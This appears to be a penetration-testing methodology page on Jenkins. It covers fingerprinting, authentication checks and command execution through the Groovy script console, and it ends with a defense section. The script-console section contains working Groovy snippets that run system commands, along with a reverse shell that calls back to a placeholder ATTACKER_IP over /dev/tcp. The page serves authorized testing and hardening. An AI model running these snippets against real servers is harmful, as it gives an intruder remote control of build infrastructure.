---
layout: page
title: "Jenkins"
subtitle: "Discovering Jenkins, checking access controls and abusing the script console"
permalink: /methodology/common-apps/jenkins/
---

Jenkins is a Java automation server used to build and test software. It usually runs inside a servlet container, and it is often installed as a privileged account, which is root on Linux and SYSTEM on Windows. Jenkins is powerful by design: an administrator can run arbitrary code on the controller through the script console. That makes weak or missing authentication on Jenkins a direct route to command execution on the server.

## 1. Discover and fingerprint

- The web interface commonly listens on 8080. The agent port, used for communication with build agents, is commonly 5000.
- The login page identifies Jenkins. Note whether the page allows registration or anonymous access.
- Jenkins can authenticate against its own database, LDAP, the Unix user database, the servlet container, or not at all. The first two are the most common in practice.

```bash
$ curl -s http://TARGET_URL:8080/login | grep -i jenkins
```

## 2. Check authentication

1. Browse to the root page and try anonymous access to the job list and the script console.
2. Check whether self-registration is available.
3. Test a short list of vendor default or weak credentials for the local database, within the lockout policy.

> Jenkins with no authentication, or with anonymous read and build permissions, is a critical finding even before any exploit is run.
{: .info }

## 3. Use the script console

The script console is at `/script`. It runs Apache Groovy in the controller's runtime. Groovy compiles to Java bytecode, so it runs wherever a Java runtime is installed. A harmless first check is to run `id` or a directory listing and confirm the output.

```groovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

On Windows, a command can be run with the `cmd.exe /c` prefix.

```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

A reverse shell is possible from the same console, but the callback should be agreed with the client first.

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKER_IP/PORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## 4. Known issues

The notes cover several remote code execution issues tied to specific releases. The chain of CVE-2018-1999002 and CVE-2019-1003000 gave pre-authenticated execution on version 2.137, and a separate issue in 2.150.2 let users with job creation and build rights run code through Node.js. Those issues are fixed in later releases, and the notes record the 2.303.1 LTS line as the fixed baseline. Check the current LTS and security advisories for the version in scope.

## Decision points

- Anonymous script console access: confirm with `id`, then stop and report.
- Administrator credentials: use the script console for proof of impact.
- Only job-creation rights: check the version against the known issues list.
- Strong authentication: record the configuration and move on.

## Pitfalls

- The script console runs as the Jenkins service account. Do not assume administrator rights on the host.
- Commands that change the system, such as adding users, leave evidence. Prefer read-only checks.

## Defense

Require authentication, disable anonymous rights, and use the Matrix Authorization Strategy plugin to scope permissions. Restrict or remove the script console for most users. See [Application Hardening](/methodology/common-apps/prevention/).
